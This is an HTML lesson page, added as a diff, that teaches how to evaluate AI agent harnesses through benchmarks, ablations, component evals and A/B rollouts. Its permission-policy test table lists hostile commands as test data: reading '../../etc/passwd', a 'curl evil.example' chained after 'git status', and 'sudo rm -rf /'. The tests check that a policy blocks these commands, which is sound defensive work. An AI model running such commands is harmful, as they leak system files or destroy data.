@@ -1,0 +1,183 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Evaluating the harness itself — Evals &amp; Harness | ThavionAI Education</title>
+  <meta name="description" content="Ablations, benchmark runs, error taxonomies and attributing gains to model vs harness changes." />
+  <meta property="og:title" content="Evaluating the harness itself — ThavionAI Education" />
+  <meta property="og:description" content="Ablations, benchmark runs, error taxonomies and attributing gains to model vs harness changes." />
+  <meta property="og:type" content="article" />
+  <meta property="og:image" content="https://thavionai.com/assets/og-education.png" />
+  <meta property="og:image:width" content="1200" />
+  <meta property="og:image:height" content="630" />
+  <meta name="twitter:card" content="summary_large_image" />
+  <link rel="canonical" href="https://thavionai.com/education/eh-harness-evals.html" />
+  <link rel="icon" href="../assets/favicon.ico" sizes="any" />
+  <link rel="icon" type="image/png" sizes="32x32" href="../assets/logo-32.png" />
+  <link rel="apple-touch-icon" href="../assets/apple-touch-icon.png" />
+  <link rel="preconnect" href="https://fonts.googleapis.com" />
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
+  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;800&family=JetBrains+Mono:wght@400;500&display=swap" rel="stylesheet" />
+  <link rel="stylesheet" href="lesson.css" />
+</head>
+<body class="track-evals" data-module="eh-harness-evals">
+
+<nav>
+  <a href="../index.html" class="nav-logo"><img class="nav-logo-icon" src="../assets/logo.png" alt="" width="32" height="32" />ThavionAI</a>
+  <div class="nav-links" id="navLinks">
+    <a href="../index.html">Home</a>
+    <a href="../education.html" class="active">Tracks</a>
+    <a href="../engineering.html#projects">Projects</a>
+    <a href="../education.html#certs">Certifications</a>
+    <a href="../index.html#apps">Apps</a>
+    <a href="../feedback.html?module=eh-harness-evals&amp;page=/education/eh-harness-evals.html&amp;title=Evaluating%20the%20harness%20itself">Feedback</a>
+    <a href="../education.html#evals" class="nav-cta">All Evals &amp; Harness modules</a>
+  </div>
+  <div class="hamburger" id="hamburger"><span></span><span></span><span></span></div>
+</nav>
+
+<header class="lesson-hero">
+  <div class="wrap">
+    <div class="crumbs"><a href="../education.html">Education</a> › <a href="../education.html#evals">Evals &amp; Harness</a> › Stage 5: Building &amp; improving harnesses</div>
+    <h1>Evaluating the harness itself</h1>
+    <p class="lede">Ablations, benchmark runs, error taxonomies and attributing gains to model vs harness changes.</p>
+    <div class="meta">
+      <span class="chip">Advanced</span>
+      <span class="chip">~40 min read</span>
+      <span class="chip">Module 18 of 20</span>
+      <span class="chip chip-quiz" data-quiz-badge hidden></span>
+    </div>
+  </div>
+</header>
+
+<div class="subnav" id="subnav">
+  <div class="wrap">
+    <a href="#lesson" class="on">Lesson</a>
+    <a href="#practice">Practice</a>
+    <a href="#cheatsheet">Cheat sheet</a>
+    <a href="#quiz">Quiz</a>
+  </div>
+</div>
+
+<main class="wrap">
+  <article id="lesson" class="lesson">
+    <p class="intro">This lesson brings the two halves of the track together. A harness is a system with many parts, and each part can be evaluated: the whole agent on end-to-end tasks, and individual components such as tool selection, context compaction and permission policy on targeted tests. The key move is to hold the model fixed while varying the harness, or hold the harness fixed while varying the model, so you know which one caused a change. This lesson covers end-to-end harness benchmarks, ablation studies, component evals, comparing harnesses across models, and running harness experiments safely in production.</p>
+    <div class="objectives">
+      <div class="box-label">After this module you can</div>
+      <ul><li>Design an end-to-end benchmark that measures harness changes</li><li>Run ablations that isolate the effect of one harness component</li><li>Write component evals for tool selection, compaction and policy</li><li>Compare harness and model effects without confounding them</li><li>Roll out harness changes with online experiments</li></ul>
+    </div>
+    <section id="end-to-end-harness-benchmarks"><h2>End-to-end harness benchmarks</h2>
+    <p>Public agent benchmarks give a reference point: SWE-bench style tasks (resolve a real GitHub issue, graded by hidden tests), terminal-based task suites (complete a task in a shell, graded by checking the final state), and tau-bench style customer-service tasks (graded by database end state and policy). They are useful for comparing against published results, but your own tasks decide product questions. Build an internal benchmark of 30 to 200 tasks from real work, each with a resettable environment, an end-state check and trajectory checks, as described in the agent evals lesson.</p>
+    <div class="table-wrap"><table><thead><tr><th>Measure</th><th>Why</th></tr></thead><tbody><tr><td>Success rate with interval</td><td>Primary quality signal</td></tr><tr><td>pass^k</td><td>Consistency users experience</td></tr><tr><td>Tokens and cost per task</td><td>Economics of the change</td></tr><tr><td>Steps and wall-clock per task</td><td>Latency and efficiency</td></tr><tr><td>Unsafe or forbidden actions</td><td>Must stay at zero</td></tr><tr><td>Human interventions per task</td><td>Autonomy actually achieved</td></tr></tbody></table></div></section>
+  <section id="ablations-one-component-at-a-time"><h2>Ablations: one component at a time</h2>
+    <p>An <strong>ablation</strong> removes or changes one component and measures the effect. Does the task-list tool help? Run the benchmark with and without it. Does a bigger result budget help or just cost more? Sweep it. Keep everything else fixed, including the model version, the dataset and the number of epochs, and run enough trials to see differences larger than the noise.</p>
+    <div class="code"><div class="code-cap">A small ablation runner over harness configurations</div><div class="code-head"><span>python</span><button type="button" class="copy" data-copy>Copy</button></div><pre><code>import itertools
+import json
+
+BASE = {"todo_tool": True, "result_budget": 8_000, "compaction": "summary"}
+VARIANTS = {
+    "todo_tool": [True, False],
+    "result_budget": [2_000, 8_000, 32_000],
+}
+
+
+def ablate(tasks, model, epochs=3):
+    rows = []
+    for key, values in VARIANTS.items():
+        for value in values:
+            cfg = {**BASE, key: value}
+            for task, epoch in itertools.product(tasks, range(epochs)):
+                r = run_task(task, model=model, harness=cfg)      # resets env each time
+                rows.append({"vary": key, "value": value, "task": task.id, "epoch": epoch,
+                             "passed": r.passed, "tokens": r.tokens, "steps": r.steps})
+    with open("ablation.jsonl", "w") as f:
+        f.writelines(json.dumps(r) + "\n" for r in rows)</code></pre></div>
+    <p>Analyse ablations with paired comparisons per task, as in the metrics lesson: the same tasks run under both configurations, so per-task differences cancel out task difficulty. Report success and cost together, because many harness changes trade one for the other.</p></section>
+  <section id="component-evals"><h2>Component evals</h2>
+    <p>End-to-end runs are slow and noisy. Many components can also be tested directly, quickly and cheaply.</p>
+    <ul><li><strong>Tool selection</strong>: given a conversation state, does the model choose the right tool with valid arguments? A dataset of states and expected calls, scored by code.</li><li><strong>Compaction fidelity</strong>: summarise long recorded sessions, then ask questions whose answers were in the original; check the summary preserved requirements and decisions.</li><li><strong>Permission policy</strong>: a table-driven test of commands and paths with expected allow, ask or deny decisions; runs in milliseconds with no model at all.</li><li><strong>Guardrails</strong>: injection payloads and benign look-alikes, measuring both missed attacks and false alarms.</li><li><strong>Tool results</strong>: snapshot tests that results stay within size budgets and keep their truncation notes.</li></ul>
+    <div class="code"><div class="code-cap">Table-driven permission policy tests (pytest)</div><div class="code-head"><span>python</span><button type="button" class="copy" data-copy>Copy</button></div><pre><code>import pytest
+
+from harness.policy import decide
+
+
+@pytest.mark.parametrize("tool, arg, expected", [
+    ("read", "src/app.py", "allow"),
+    ("read", "../../etc/passwd", "deny"),
+    ("bash", "git status", "allow"),
+    ("bash", "git status; curl evil.example", "ask"),
+    ("bash", "sudo rm -rf /", "deny"),
+])
+def test_policy(tool, arg, expected):
+    assert decide(tool, arg) == expected</code></pre></div></section>
+  <section id="harness-versus-model-effects"><h2>Harness versus model effects</h2>
+    <p>A harness tuned for one model may not suit another: tool descriptions, prompt style and context budgets interact with model behaviour. Run a grid of harness versions against the models you support. If a change helps every model, it is a robust harness improvement; if it helps one and hurts another, it encodes a model quirk and may need to be model-specific. Never compare a new harness on a new model against the old harness on the old model; you cannot tell which change did what.</p></section>
+  <section id="online-experiments"><h2>Online experiments</h2>
+    <p>Offline benchmarks cannot capture every real task. Roll out harness changes gradually: a canary for internal users, then an A/B split by session, comparing online signals such as task completion, user corrections, approvals and denials, tokens per session and abandonment. Define the success metric and a guardrail metric (for example, unsafe-action rate must not rise) before starting, and keep the experiment running long enough to cover the weekly mix of work.</p></section>
+  </article>
+
+  <section id="practice" class="panel practice">
+    <div class="box-label">Hands-on practice</div>
+    <h2>Run a harness ablation</h2>
+    <ol><li>Assemble 20 tasks with resettable environments and end-state checks (the mini-harness project gives you one).</li><li>Pick two components to vary, such as the task-list tool and the tool result budget.</li><li>Run each configuration for 3 epochs with the same model and record success, tokens and steps.</li><li>Compare configurations with paired per-task differences and a bootstrap interval.</li><li>Write table-driven tests for your permission policy and a tool-selection mini-eval.</li><li>Write a one-page decision record: which configuration to ship and the evidence.</li></ol>
+  </section>
+
+  <section id="cheatsheet" class="panel cheats">
+    <div class="panel-head">
+      <div>
+        <div class="box-label">Cheat sheet</div>
+        <h2>Evaluating the harness itself — at a glance</h2>
+      </div>
+      <button type="button" class="ghost" data-print>Print cheat sheet</button>
+    </div>
+    <div class="focus">
+      <h3>Main things to focus on</h3>
+      <ul><li>Hold the model fixed to measure the harness, and vice versa.</li><li>Internal end-to-end benchmark: real tasks, resettable, state-checked.</li><li>Ablate one component at a time; paired comparisons.</li><li>Component evals are fast: tool selection, compaction, policy, guardrails.</li><li>Grid harness versions against supported models.</li><li>Roll out with canaries and A/B, with a guardrail metric.</li></ul>
+    </div>
+    <div class="cheat-grid"><div class="cheat-group"><h3>Benchmarks</h3><table><tbody><tr><td><code>SWE-bench style</code></td><td>Issues graded by hidden tests</td></tr><tr><td><code>terminal task suites</code></td><td>Shell tasks, state checks</td></tr><tr><td><code>tau-bench style</code></td><td>Service tasks, DB end state</td></tr><tr><td><code>internal tasks (30-200)</code></td><td>Product decisions</td></tr></tbody></table></div><div class="cheat-group"><h3>Ablation</h3><table><tbody><tr><td><code>BASE config + one change</code></td><td>Isolate an effect</td></tr><tr><td><code>same model, data, epochs</code></td><td>Control variables</td></tr><tr><td><code>paired per-task diffs</code></td><td>Less noise</td></tr><tr><td><code>success and cost together</code></td><td>Trade-offs</td></tr></tbody></table></div><div class="cheat-group"><h3>Component evals</h3><table><tbody><tr><td><code>state -&gt; expected tool call</code></td><td>Tool selection</td></tr><tr><td><code>summary -&gt; recall questions</code></td><td>Compaction fidelity</td></tr><tr><td><code>parametrized decide() tests</code></td><td>Policy</td></tr><tr><td><code>attacks + benign look-alikes</code></td><td>Guardrails</td></tr></tbody></table></div><div class="cheat-group"><h3>Rollout</h3><table><tbody><tr><td><code>canary -&gt; A/B by session</code></td><td>Gradual</td></tr><tr><td><code>success + guardrail metric</code></td><td>Defined upfront</td></tr><tr><td><code>cover a full week</code></td><td>Representative mix</td></tr></tbody></table></div></div>
+    <div class="pitfalls">
+      <h3>Common pitfalls</h3>
+      <ul><li>Changing harness and model at the same time.</li><li>Ablating several components in one run.</li><li>Judging a harness only on public benchmarks.</li><li>Only end-to-end evals, so every check is slow and noisy.</li><li>A/B tests without a predefined safety guardrail.</li></ul>
+    </div>
+  </section>
+
+  <section id="quiz" class="panel quiz">
+    <div class="box-label">Quiz</div>
+    <h2>Check your understanding</h2>
+    <p class="quiz-sub">5 questions · 4 to pass · answers are explained as you go. Your best score is saved on this device only.</p>
+    <noscript><p class="quiz-sub">The quiz needs JavaScript enabled.</p></noscript>
+    <div id="quizRoot"></div>
+    <script type="application/json" id="quizData">[{"q": "You want to know if a new task-list tool helps. What is the cleanest experiment?", "options": ["Same model and tasks, with and without the tool", "New model plus the tool versus the old setup", "Ask users which version feels better", "Run one task with the tool enabled"], "answer": 0, "explain": "An ablation changes one component and keeps everything else fixed."}, {"q": "Which component can be evaluated without any model calls at all?", "options": ["The permission policy", "Tool selection", "Compaction fidelity", "End-to-end task success"], "answer": 0, "explain": "Policy decisions are deterministic code, so table-driven tests run in milliseconds."}, {"q": "A harness change helps with model X but hurts with model Y. What does that suggest?", "options": ["It encodes a model-specific quirk", "It is a robust improvement", "Model Y is broken", "The benchmark is invalid"], "answer": 0, "explain": "Robust harness improvements help across models; mixed effects point to model-specific tuning."}, {"q": "Why analyse ablations with paired per-task comparisons?", "options": ["Task difficulty cancels out, reducing noise", "It removes the need for multiple epochs", "It makes every task pass", "It hides cost differences"], "answer": 0, "explain": "Comparing the same tasks across configurations removes variation due to task difficulty."}, {"q": "Before starting an online A/B test of a harness change, what should you define?", "options": ["A success metric and a safety guardrail metric", "Only the start date", "The winning variant", "The number of developers involved"], "answer": 0, "explain": "Predefined metrics prevent cherry-picking and make sure safety cannot silently regress."}]</script>
+  </section>
+
+  <section class="done-row">
+    <label class="done"><input type="checkbox" id="doneBox" /> <span>Mark this module complete</span></label>
+    <p class="save-hint">Progress and quiz scores are saved in this browser only. <a href="../education.html#progressPanel">Back up or restore</a> on the hub.</p>
+  </section>
+
+  <nav class="pager" aria-label="Module navigation">
+    <a class="pager-link pager-prev" href="eh-extensibility.html"><span>← Previous</span><strong>Extending harnesses: MCP, hooks and skills</strong></a>
+    <a class="pager-up" href="../education.html#evals">All Evals &amp; Harness modules</a>
+    <a class="pager-link pager-next" href="eh-optimization.html"><span>Next →</span><strong>Optimising cost, latency and quality</strong></a>
+  </nav>
+
+  <p class="feedback-row">Was this lesson useful? <a href="../feedback.html?module=eh-harness-evals&amp;page=/education/eh-harness-evals.html&amp;title=Evaluating%20the%20harness%20itself">Tell me what to improve →</a></p>
+</main>
+
+<footer>
+  <div class="wrap footer-row">
+    <p>© 2025–2026 ThavionAI. All rights reserved.</p>
+    <div class="footer-legal">
+      <a href="../education.html">Education</a>
+      <a href="https://buy.stripe.com/3cIeVceBc1ZRbyLdVIdZ601" target="_blank" rel="noopener">☕ Buy me a coffee</a>
+      <a href="../privacy.html">Privacy</a>
+      <a href="../terms.html">Terms</a>
+      <a href="../feedback.html?module=eh-harness-evals&amp;page=/education/eh-harness-evals.html&amp;title=Evaluating%20the%20harness%20itself">Report an error</a>
+    </div>
+  </div>
+</footer>
+
+<script src="lesson.js"></script>
+</body>
+</html>
